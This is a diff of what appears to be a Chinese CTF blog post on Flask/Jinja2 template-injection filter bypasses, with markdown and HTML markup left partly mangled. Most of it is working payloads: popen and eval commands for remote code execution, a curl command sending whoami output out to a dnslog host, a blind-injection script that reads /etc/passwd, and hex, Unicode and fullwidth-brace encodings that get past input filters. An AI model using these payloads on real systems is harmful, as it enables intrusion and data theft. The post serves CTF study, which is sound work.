@@ -18731,67 +18731,55 @@ payload</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__getattribute__(request.args.arg1).__base__.__subclasses__().pop(<span class="number">376</span>).__init__.__globals__.popen(request.args.arg2).read()&#125;&#125;&amp;arg1=__class__&amp;arg2=whoami</span><br></pre></td></tr></table></figure>
 <h3 id="过滤-v4">过滤<code>&#123;&#125;</code></h3>
 <h4 id="DNSLOG外带数据">DNSLOG外带数据</h4>
-<p>用<code>&#123;%%&#125;</code>替代了<code>&#123;&#123;&#125;&#125;`，使用判断语句进行dns外带数据：
-
+<p>用<code>&#123;%%&#125;</code>替代，使用判断语句进行dns外带数据：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> ().__class__.__base__.__subclasses__()[<span class="number">433</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&quot;curl `whoami`.k1o75b.ceye.io&quot;</span>).read()==<span class="string">&#x27;ssti&#x27;</span> %&#125;<span class="number">1</span>&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
-
-#### 盲注
-
+<h4 id="盲注">盲注</h4>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://ip:5000/?name=&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">payload</span>):</span></span><br><span class="line">    r = requests.get(url+payload).content</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;kawhi&#x27;</span> <span class="keyword">in</span> r</span><br><span class="line"></span><br><span class="line">password  = <span class="string">&#x27;&#x27;</span></span><br><span class="line">s = <span class="string">r&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;$\&#x27;()*+,-./:;&lt;=&gt;?@[\\]^`&#123;|&#125;~\&#x27;&quot;_%&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        payload = <span class="string">&#x27;&#123;% if ().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__.open(&quot;/etc/passwd&quot;).read()[&#x27;</span>+str(i)+<span class="string">&#x27;:&#x27;</span>+str(i+<span class="number">1</span>)+<span class="string">&#x27;] == &quot;&#x27;</span>+c+<span class="string">&#x27;&quot; %&#125;kawhi&#123;% endif %&#125;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> check(payload):</span><br><span class="line">            password += c</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span> password</span><br></pre></td></tr></table></figure>
-
-#### print标记
-
+<h4 id="print标记">print标记</h4>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%<span class="keyword">print</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)%&#125;</span><br></pre></td></tr></table></figure>
-
-## Bypass Plus
-
-介绍一些常见过滤组合和最近的赛题。
-
-### 过滤`_`，`.`和`'`
-
-python3下可以使用`_frozen_importlib_external.FileLoader`的`get_data()`方法，第一个是参数0，第二个为要读取的文件名：
-
+<h2 id="Bypass-Plus">Bypass Plus</h2>
+<p>介绍一些常见过滤组合和最近的赛题。</p>
+<h3 id="过滤-，-和">过滤<code>_</code>，<code>.</code>和<code>'</code></h3>
+<p>python3下可以使用<code>_frozen_importlib_external.FileLoader</code>的<code>get_data()</code>方法，第一个是参数0，第二个为要读取的文件名：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">222</span>].get_data(<span class="number">0</span>,<span class="string">&quot;app.py&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-下划线可以用编码绕过和`requests`绕过：
-
+<p>下划线可以用编码绕过和<code>requests</code>绕过：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>][<span class="string">&quot;\x5F\x5Fbases\x5F\x5F&quot;</span>][<span class="number">0</span>][<span class="string">&quot;\x5F\x5Fsubclasses\x5F\x5F&quot;</span>]()[<span class="number">222</span>][<span class="string">&quot;get\x5Fdata&quot;</span>](<span class="number">0</span>, <span class="string">&quot;app\x2Epy&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-### 过滤`args`，`.`和`_`
-
-参考y1ng师傅的payload：
-
+<h3 id="过滤args，-和">过滤<code>args</code>，<code>.</code>和<code>_</code></h3>
+<p>参考y1ng师傅的payload：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x1&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x2&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x3&#x27;</span>])()|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x4&#x27;</span>])(<span class="number">40</span>)|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x5&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x6&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x4&#x27;</span>])(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x7&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x4&#x27;</span>])(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x8&#x27;</span>])(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x9&#x27;</span>])&#125;&#125;</span><br><span class="line"></span><br><span class="line">post:x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
-
-## Update
-
-### Unicode绕过
-
-安洵杯2020 EasyFlask：https://github.com/D0g3-Lab/i-SOON_CTF_2020
-
-GitHub上的题目环境有点问题，文件给的好像不全。
-
-可以看一下过滤：
-
-![](https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201219211009.png)
-
-直接来看payload：
-
+<h2 id="Update">Update</h2>
+<h3 id="Unicode绕过">Unicode绕过</h3>
+<p>安洵杯2020 EasyFlask：<a href="https://github.com/D0g3-Lab/i-SOON_CTF_2020">https://github.com/D0g3-Lab/i-SOON_CTF_2020</a></p>
+<p>GitHub上的题目环境有点问题，文件给的好像不全。</p>
+<p>可以看一下过滤：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201219211009.png" alt=""></p>
+<p>直接来看payload：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%print(lipsum|attr(%<span class="number">22</span>\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f%<span class="number">22</span>))|attr(%<span class="number">22</span>\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f%<span class="number">22</span>)(%<span class="number">22</span>os%<span class="number">22</span>)|attr(%<span class="number">22</span>popen%<span class="number">22</span>)(%<span class="number">22</span>whoami%<span class="number">22</span>)|attr(%<span class="number">22</span>read%<span class="number">22</span>)()%&#125;</span><br></pre></td></tr></table></figure>
+<p>其中<code>print</code>用来绕过<code>&#123;&#123;&#125;&#125;`，`attr`绕过`.`。
 
-其中`print`用来绕过`&#123;&#123;&#125;&#125;</code>，<code>attr</code>绕过<code>.</code>。</p>
-<p>然后这里的<code>lipsum</code>是一个方法，可以直接调用os方法，也可以使用<code>__buildins__</code>：</p>
+然后这里的`lipsum`是一个方法，可以直接调用os方法，也可以使用`__buildins__`：
+
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br><span class="line">&#123;&#123;lipsum.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
-<p>再使用Unicode编码绕过</p>
-<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201219211449.png" alt=""></p>
+
+再使用Unicode编码绕过
+
+![](https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201219211449.png)
+
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()|attr(<span class="string">&quot;__class__&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;()|attr(<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
-<p>所以官方给的payload就是：</p>
+
+所以官方给的payload就是：
+
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%print(lipsum|attr(<span class="string">&quot;__globals__&quot;</span>))|attr(<span class="string">&quot;__getitem__&quot;</span>)(<span class="string">&quot;os&quot;</span>)|attr(<span class="string">&quot;popen&quot;</span>)(<span class="string">&quot;whoami&quot;</span>)|attr(<span class="string">&quot;read&quot;</span>)()%&#125;</span><br></pre></td></tr></table></figure>
-<p>在线网址转换：<a href="https://www.branah.com/unicode-converter">https://www.branah.com/unicode-converter</a></p>
-<p>PHP脚本转换：</p>
+
+在线网址转换：https://www.branah.com/unicode-converter
+
+PHP脚本转换：
+
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//字符串转Unicode编码</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unicode_encode</span>(<span class="params">$strLong</span>) </span>&#123;</span><br><span class="line">  $strArr = preg_split(<span class="string">&#x27;/(?&lt;!^)(?!$)/u&#x27;</span>, $strLong);<span class="comment">//拆分字符串为数组(含中文字符)</span></span><br><span class="line">  $resUnicode = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">foreach</span> ($strArr <span class="keyword">as</span> $str)</span><br><span class="line">  &#123;</span><br><span class="line">      $bin_str = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">      $arr = is_array($str) ? $str : str_split($str);<span class="comment">//获取字符内部数组表示,此时$arr应类似array(228, 189, 160)</span></span><br><span class="line">      <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $value)</span><br><span class="line">      &#123;</span><br><span class="line">          $bin_str .= decbin(ord($value));<span class="comment">//转成数字再转成二进制字符串,$bin_str应类似111001001011110110100000,如果是汉字&quot;你&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">      $bin_str = preg_replace(<span class="string">&#x27;/^.&#123;4&#125;(.&#123;4&#125;).&#123;2&#125;(.&#123;6&#125;).&#123;2&#125;(.&#123;6&#125;)$/&#x27;</span>, <span class="string">&#x27;$1$2$3&#x27;</span>, $bin_str);<span class="comment">//正则截取, $bin_str应类似0100111101100000,如果是汉字&quot;你&quot;</span></span><br><span class="line">      $unicode = dechex(bindec($bin_str));<span class="comment">//返回unicode十六进制</span></span><br><span class="line">      $_sup = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">      <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">4</span> - strlen($unicode); $i++)</span><br><span class="line">      &#123;</span><br><span class="line">          $_sup .= <span class="string">&#x27;0&#x27;</span>;<span class="comment">//补位高字节 0</span></span><br><span class="line">      &#125;</span><br><span class="line">      $str =  <span class="string">&#x27;\\u&#x27;</span> . $_sup . $unicode; <span class="comment">//加上 \u  返回</span></span><br><span class="line">      $resUnicode .= $str;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> $resUnicode;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Unicode编码转字符串方法1</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unicode_decode</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// 转换编码，将Unicode编码转换成可以浏览的utf-8编码</span></span><br><span class="line">  $pattern = <span class="string">&#x27;/([\w]+)|(\\\u([\w]&#123;4&#125;))/i&#x27;</span>;</span><br><span class="line">  preg_match_all($pattern, $name, $matches);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">empty</span>($matches))</span><br><span class="line">  &#123;</span><br><span class="line">    $name = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; count($matches[<span class="number">0</span>]); $j++)</span><br><span class="line">    &#123;</span><br><span class="line">      $str = $matches[<span class="number">0</span>][$j];</span><br><span class="line">      <span class="keyword">if</span> (strpos($str, <span class="string">&#x27;\\u&#x27;</span>) === <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        $code = base_convert(substr($str, <span class="number">2</span>, <span class="number">2</span>), <span class="number">16</span>, <span class="number">10</span>);</span><br><span class="line">        $code2 = base_convert(substr($str, <span class="number">4</span>), <span class="number">16</span>, <span class="number">10</span>);</span><br><span class="line">        $c = chr($code).chr($code2);</span><br><span class="line">        $c = iconv(<span class="string">&#x27;UCS-2&#x27;</span>, <span class="string">&#x27;UTF-8&#x27;</span>, $c);</span><br><span class="line">        $name .= $c;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        $name .= $str;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> $name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Unicode编码转字符串</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unicode_decode2</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">  $json = <span class="string">&#x27;&#123;&quot;str&quot;:&quot;&#x27;</span> . $str . <span class="string">&#x27;&quot;&#125;&#x27;</span>;</span><br><span class="line">  $arr = json_decode($json, <span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">empty</span>($arr)) <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">return</span> $arr[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> unicode_encode(<span class="string">&#x27;__class__&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> unicode_decode(<span class="string">&#x27;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&#x27;</span>);</span><br><span class="line"><span class="comment">//\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f__class__</span></span><br></pre></td></tr></table></figure>
-<h3 id="魔改字符">魔改字符</h3>
-<p>太湖杯easy_web，上面所说的过滤双大括号，在一些特定的题目可以魔改<code>&#123;&#123;&#125;&#125;</code>，比如说这道题由于有个字符规范器可以把我们输入的文本标准化，所以可以使用这种方法。</p>
+
+### 魔改字符
+
+太湖杯easy_web，上面所说的过滤双大括号，在一些特定的题目可以魔改`&#123;&#123;&#125;&#125;</code>，比如说这道题由于有个字符规范器可以把我们输入的文本标准化，所以可以使用这种方法。</p>
 <p>可以在Unicode字符网站寻找绕过的字符，直接在网址搜索<code>&#123;</code>，就会出现类似的字符，就可以找到<code>︷</code>和<code>︸</code>了，网址：<a href="https://www.compart.com/en/unicode/U+FE38">https://www.compart.com/en/unicode/U+FE38</a></p>
 <p>Payload：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">︷︷config︸︸</span><br><span class="line">%EF%B8%B7%EF%B8%B7config%EF%B8%B8%EF%B8%B</span><br></pre></td></tr></table></figure>
